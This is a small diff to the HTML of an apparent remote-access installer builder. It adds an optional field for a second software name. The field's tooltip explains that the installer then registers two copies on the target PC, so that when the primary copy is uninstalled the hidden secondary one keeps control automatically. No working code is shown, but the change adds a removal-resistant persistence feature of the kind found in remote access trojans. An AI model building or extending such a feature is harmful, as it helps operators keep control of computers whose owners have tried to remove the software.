@@ -723,6 +723,7 @@
         <p class="build-help">Build an installer to deploy to remote machines. Label the machines with these fields and pick your installer type, then share the link or download it.</p>
         <div class="build-grid">
           <label>Software name</label><input id="b-appname" placeholder="Support" maxlength="40" />
+          <label>Second software name <span style="color:var(--txt3);font-weight:400;font-size:11px">(optional)</span></label><input id="b-appname2" placeholder="Leave empty to skip" maxlength="40" title="If set, the installer registers TWO copies on the remote PC under both names. One device entry in your dashboard; when the primary copy is uninstalled, the secondary keeps control automatically." />
           <label>Name</label><select id="b-name"><option value="machine">Use Machine Name</option></select>
           <label>Company</label><input id="b-company" placeholder="e.g. Acme Corporation" />
           <label>Site</label><input id="b-site" placeholder="Optional" />
